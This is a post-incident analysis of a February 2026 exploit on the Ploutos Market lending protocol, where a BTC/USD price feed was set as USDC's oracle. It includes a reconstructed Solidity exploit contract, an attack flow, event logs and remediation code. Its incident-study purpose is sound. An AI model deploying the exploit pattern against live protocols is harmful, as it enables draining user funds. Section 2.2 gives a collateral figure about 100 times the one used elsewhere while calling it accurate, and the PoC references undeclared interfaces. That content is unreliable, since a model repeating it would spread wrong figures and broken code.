# Ploutos Market — Misconfigured Oracle Analysis (BTC/USD → USDC)

| Field | Details |
|------|------|
| **Date** | 2026-02-26 |
| **Protocol** | Ploutos Market (Ethereum Ploutos Market) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~187.36 WETH (≈ $389,802 / attacker net profit) |
| **Attacker** | [0x3885...a18c](https://etherscan.io/address/0x3885869b0f4526806B468a0c64A89BB860a18cEe) |
| **Attack Contract** | [0x3e47...84fa](https://etherscan.io/address/0x3e47945Cca05439f99029A3D21e3166Ce1A84FAb) |
| **Attack Tx** | [0xa17d...8474](https://etherscan.io/tx/0xa17dc37e1b65c65d20042212fb834974f7faaa961442e3fc05393778705f8474) |
| **Vulnerable Contract** | [0x9DCE...D30](https://etherscan.io/address/0x9DCE7A180C34203fEE8cE8CA62f244FeeB67BD30) (AaveOracle) |
| **Root Cause** | Chainlink BTC/USD feed misconfigured as USDC price source — 1 USDC valued at $68,554 |
| **PoC Source** | Unregistered (no DeFiHackLabs submission) |

---

## 1. Vulnerability Overview

Ploutos Market is an Ethereum-based lending protocol forked from Aave v3. During deployment, the **Chainlink BTC/USD feed** (`0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c`) was configured as the **price source for the USDC asset**. This feed returns the Bitcoin price, not the USDC price.

At the time of the attack, the BTC/USD price was **$68,554**, and the protocol recognized 1 USDC as $68,554. Compared to the actual USDC price ($1.00), this represents a **68,554x overvaluation**.

The attacker supplied only **8.879 USDC** (actual value ~$8.88) as collateral, but from the protocol's perspective this collateral was valued at **$608,705**. With a 65% LTV, up to **$395,658** worth of WETH could be borrowed, and the attacker actually borrowed 187.37 WETH worth $389,802.

---

## 2. Vulnerable Code Analysis

### 2.1 Misconfigured Oracle (Core Vulnerability)

**AaveOracle price query logic**:
```solidity
// AaveOracle.sol — getAssetPrice()
function getAssetPrice(address asset) public view override returns (uint256) {
    AggregatorInterface source = assetsSources[asset];  // ❌ USDC → BTC/USD feed registered

    if (asset == BASE_CURRENCY) {
        return BASE_CURRENCY_UNIT;
    } else if (address(source) == address(0)) {
        return _fallbackOracle.getAssetPrice(asset);
    } else {
        int256 price = source.latestAnswer();  // ❌ Calls latestAnswer() on BTC/USD feed
        if (price > 0) {
            return uint256(price);             // ❌ Returns $68,554 → used as USDC price
        } else {
            return _fallbackOracle.getAssetPrice(asset);
        }
    }
}
```

**Issue**: The oracle source mapping (`assetsSources[USDC]`) is configured with the BTC/USD feed instead of the USDC/USD feed. The Aave v3 oracle uses the `latestAnswer()` return value from the source directly as the dollar price, so the BTC price of $68,554 is processed as the USDC price.

**Actual on-chain state (attack block 24538897)**:
```
assetsSources[USDC] = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c
0xF4030086.description() = "BTC / USD"          ← should be a USDC oracle
0xF4030086.latestAnswer() = 6,855,405,329,514   ← $68,554.05 (8 decimals)
```

**Corrected configuration**:
```solidity
// ✅ USDC should be configured with the Chainlink USDC/USD feed
// Ethereum Mainnet USDC/USD: 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6

// At deployment or when calling setAssetSources():
address[] memory assets = new address[](1);
address[] memory sources = new address[](1);
assets[0] = USDC_ADDRESS;
sources[0] = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;  // ✅ Chainlink USDC/USD
aaveOracle.setAssetSources(assets, sources);
```

### 2.2 Overvalued Collateral Calculation

```solidity
// ValidationLogic.sol (Aave v3 internal) — collateral value calculation
function calculateUserAccountData(...) {
    // USDC collateral value calculation:
    // userCollateralInBaseCurrency += assetPrice * userBalance / 10^decimals
    // = 6,855,405,329,514 * 8,879,192 / 10^6    ← ❌ BTC price × USDC balance
    // = 6,085,305,540,774,888 / 1e8
    // = $60,853,055                              ← ❌ Actual $8.88 → 6.8M× error

    // Borrowable amount (LTV 65%):
    // maxBorrow = $60,853,055 * 65% = $39,554,485 (theoretical maximum)
    // → Attacker actually borrowed only $389,802 (a small fraction)
}
```

> **Note**: The calculation above reflects accurate values accounting for USDC 6 decimals. Theoretically unlimited borrowing was possible, but the attacker was constrained by the WETH liquidity limit (the pool's WETH balance).

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attack contract `0x3e47945...` pre-deployed
- Plan to leverage flash swap from Uniswap V2 USDC/WETH LP pool (`0xb4e16d01...`)
- No upfront capital required (fully flash-swap-based attack)

### 3.2 Execution Phase

```
1. UniV2 Flash Swap initiated
   ┌─────────────────────────────────────────────────┐
   │ UniV2 USDC/WETH LP (0xb4e16d01...)              │
   │ → Sends 8.879 USDC to attack contract           │
   │   (to be repaid with 0.004289 WETH in callback) │
   └────────────────────┬────────────────────────────┘
                        │ 8.879 USDC received
                        ▼
2. Supply USDC collateral to Ploutos
   ┌─────────────────────────────────────────────────┐
   │ Ploutos Pool (0x7398e7e3...)                     │
   │ supply(USDC, 8,879,192, exploitContract, 0)     │
   │                                                 │
   │ Oracle evaluation:                              │
   │   8.879 USDC × $68,554/USDC = $608,705          │ ← ❌ BTC price applied
   │   LTV 65% → borrow limit $395,658               │
   └────────────────────┬────────────────────────────┘
                        │ LEthereumUSDC (aToken) received
                        ▼
3. Borrow WETH
   ┌─────────────────────────────────────────────────┐
   │ Ploutos Pool                                    │
   │ borrow(WETH, 187,366,746,326,704,993,556,       │
   │        2, 0, exploitContract)                  │
   │                                                 │
   │ Actual borrow value: 187.37 WETH × $2,080 = $389,802 │
   │ Protocol-recognized LTV: 64.1% → allowed ✓     │
   └────────────────────┬────────────────────────────┘
                        │ 187.37 WETH received
                        ▼
4. Repay UniV2 Flash Swap
   ┌─────────────────────────────────────────────────┐
   │ UniV2 callback completed                        │
   │ → Transfer 0.004289 WETH (cost to swap 8.879 USDC) │
   └─────────────────────────────────────────────────┘
                        │
                        ▼
5. Profit realized
   Attacker profit: 187.37 - 0.004289 = 187.362 WETH ≈ $389,802
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Cost incurred | 0.004289 WETH (≈ $8.92, flash swap fee) |
| WETH borrowed | 187.3667 WETH |
| Net profit | **187.3624 WETH ≈ $389,802** |
| Ploutos bad debt | 187.3667 WETH (collateral actual value $8.88 — unliquidatable) |

---

## 4. PoC Code (Reconstructed)

No public PoC exists; reconstructed from on-chain data.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswapV2Pair {
    // Flash swap: borrow amount0 or amount1, repay in callback
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IPloutosPool {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode,
                    uint16 referralCode, address onBehalfOf) external;
}

contract PloutosExploit {
    address constant USDC     = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    // Uniswap V2 USDC/WETH LP pool
    address constant UNIV2_LP = 0xb4e16d0168e52d35cacd2c6185b44281ec28c9dc;
    // Ploutos lending pool
    address constant POOL     = 0x7398e7e3603119d9241e45f688734436fd7b1540;

    function attack() external {
        // Step 1: UniV2 flash swap — borrow 8.879 USDC interest-free
        // amount0Out: USDC (token0), amount1Out: 0 WETH
        IUniswapV2Pair(UNIV2_LP).swap(
            8_879_192,   // 8.879192 USDC (6 decimals)
            0,
            address(this),
            abi.encode("flash")  // non-empty triggers callback
        );
        // After callback completes, WETH profit remains in this contract
    }

    // Steps 2-4: UniV2 flash swap callback
    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
        // Step 2: Supply received USDC as collateral to Ploutos
        // Oracle (BTC/USD): 8.879 USDC = $608,705 (actual: $8.88)
        IERC20(USDC).approve(POOL, type(uint256).max);
        IPloutosPool(POOL).supply(USDC, amount0, address(this), 0);

        // Step 3: Borrow WETH within 64% LTV
        // 187.37 WETH × $2,080 = $389,802 / $608,705 = 64.0% LTV → allowed
        uint256 wethToBorrow = 187_366_746_326_704_993_556;  // 187.37 WETH
        IPloutosPool(POOL).borrow(WETH, wethToBorrow, 2, 0, address(this));

        // Step 4: Repay flash swap — WETH cost for 8.879 USDC
        // xy=k formula: transfer ~0.004289 WETH
        IWETH(WETH).transfer(UNIV2_LP, 4_289_216_474_598_283);
        // Remaining 187.362 WETH is attacker profit
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Misconfigured price oracle (BTC/USD → USDC) | CRITICAL | CWE-1284 |
| V-02 | Missing oracle configuration validation logic | HIGH | CWE-20 |
| V-03 | No pre-deployment oracle integration testing | HIGH | CWE-754 |

### V-01: Misconfigured Price Oracle

- **Description**: The Chainlink BTC/USD feed (`0xF4030086...`) was registered in `assetsSources[USDC]` of AaveOracle instead of the Chainlink USDC/USD feed. 1 USDC is valued at the current BTC price ($68,554), causing collateral value to be overstated by 68,554×.
- **Impact**: 8.879 USDC ($8.88) used to borrow 187.37 WETH ($389,802) — entire protocol WETH liquidity can be drained.
- **Attack Condition**: Immediately exploitable once a small amount of USDC is obtained (e.g., via flash swap). No upfront capital required.

### V-02: Missing Oracle Configuration Validation

- **Description**: `AaveOracle.setAssetSources()` unconditionally accepts any `AggregatorInterface` address. There is no logic to verify `description()` or validate the return value range upon registration.
- **Impact**: Even if a protocol admin registers an incorrect feed, it cannot be detected immediately.
- **Attack Condition**: Immediately exploitable once an incorrect feed is configured and the asset is allowed as collateral.

### V-03: No Pre-Deployment Oracle Integration Testing

- **Description**: The deployment script did not verify that the oracle returns the intended price ($1.00/USDC) for each asset.
- **Impact**: An obvious misconfiguration (BTC price used as USDC price) went undetected until after deployment.
- **Attack Condition**: N/A (operational/management issue).

---

## 6. Remediation Recommendations

### Immediate Action

```solidity
// ✅ Set correct oracle source — Chainlink USDC/USD
// Ethereum Mainnet Chainlink USDC/USD: 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6

address[] memory assets = new address[](1);
address[] memory sources = new address[](1);
assets[0]  = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;  // USDC
sources[0] = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;  // ✅ USDC/USD feed

// Update immediately with admin privileges
aaveOracle.setAssetSources(assets, sources);
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Misconfigured oracle | Check `description()` on `setAssetSources()` call — verify asset name matches the ticker |
| Missing validation | Assert that `getAssetPrice()` return value is within a reasonable range ($0.95–$1.05 for USDC) immediately after registration |
| Insufficient deployment testing | Include an oracle price validation script as a mandatory step in the deployment pipeline for all assets |
| Single oracle dependency | Add a dual oracle (e.g., TWAP) or a price deviation circuit breaker |

**Deployment script validation example**:
```solidity
// Automated post-deployment verification
function verifyOracleSetup(address oracle, address[] memory assets) external view {
    for (uint i = 0; i < assets.length; i++) {
        uint256 price = IAaveOracle(oracle).getAssetPrice(assets[i]);
        // USDC/USDT must be within $0.90–$1.10 range
        if (isStablecoin(assets[i])) {
            require(price >= 0.90e8 && price <= 1.10e8,  // ✅ Range validation
                "Oracle price out of stablecoin range");
        }
    }
}
```

---

## 7. Lessons Learned

1. **Oracle addresses are the most critical configuration values in a protocol.** At deployment, the oracle `description()` and actual return value for each asset must be manually cross-verified. Automated deployment scripts must include oracle price range validation as a mandatory step.

2. **Resetting oracles when forking Aave v3 is the most dangerous step.** The original Aave oracle is safe, but when forking, the correct feed address for each asset must be entered manually — and mistakes are easy to make in this process. A checklist and code review must be conducted in parallel.

3. **The small-collateral / large-borrow pattern is the classic signature of an oracle attack.** A circuit breaker should be in place to monitor transactions in real time where the collateral-to-borrow ratio deviates significantly from the normal LTV, and automatically pause activity.

4. **Flash swaps are a zero-cost entry point for oracle attacks.** An attacker can obtain a small amount of an asset at no cost via flash swap and exploit a misconfigured oracle. If the oracle configuration is correct, this attack vector does not exist.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | On-chain Actual Value | Description |
|------|-------------|------|
| Flash swap USDC | 8,879,192 (8.879192 USDC) | UniV2 pair → exploit |
| USDC supplied | 8,879,192 | exploit → Ploutos pool |
| aToken minted | 8,879,192 (LEthereumUSDC) | mint from=0x0 |
| USDC oracle price | 6,855,405,329,514 ($68,554.05) | BTC/USD at block 24538897 |
| WETH oracle price | 208,047,000,000 ($2,080.47) | ETH/USD normal |
| WETH borrowed | 187,366,746,326,704,993,556 (187.3667 WETH) | pool → exploit |
| debtToken minted | 187,366,746,326,704,993,556 | variableDebtEthereumWETH mint |
| Flash swap repaid | 4,289,216,474,598,283 (0.004289 WETH) | exploit → UniV2 |
| Net profit | 187,362,457,110,230,395,273 wei ≈ **187.362 WETH** | ≈ $389,802 |

### 8.2 On-Chain Event Log Sequence

```
1.  Transfer(USDC): UniV2 LP    → exploit contract   [8,879,192]
2.  Approval(USDC): exploit     → Ploutos Pool       [max uint]
3.  Transfer(USDC): exploit     → Ploutos Pool       [8,879,192]
4.  Transfer(aUSDC): 0x000...   → exploit contract   [8,879,192]   // mint
5.  ReserveDataUpdated (supply)
6.  Transfer(debtWETH): 0x000.. → exploit contract   [187.37e18]   // mint
7.  ReserveDataUpdated (borrow)
8.  Transfer(WETH):  Ploutos    → exploit contract   [187.37e18]
9.  Borrow event from Ploutos Pool
10. Transfer(WETH):  exploit    → UniV2 LP           [0.004289e18] // repay
11. Swap event from UniV2 pair
12. WETH Withdrawal event
```

### 8.3 Pre-Condition Verification (at attack block)

| Item | State immediately before attack |
|------|---------------|
| USDC oracle source | `0xF4030086...` (Chainlink BTC/USD) |
| WETH oracle source | `0x5f4eC3Df...` (Chainlink ETH/USD, normal) |
| Ploutos USDC LTV | 65% |
| Ploutos USDC Liq. Threshold | 70% |
| BASE_CURRENCY_UNIT | 1e8 (USD basis) |

**Post-incident confirmation**: After the attack, the current value of `getSourceOfAsset(USDC)` has been changed to `0x3E7d1eAB...` (Chainlink USDT/USD, ~$1.00). This is evidence of an emergency measure replacing BTC/USD with USDT/USD. (Note: the correct remediation is to use the Chainlink USDC/USD feed at `0x8fFfFfd4...`.)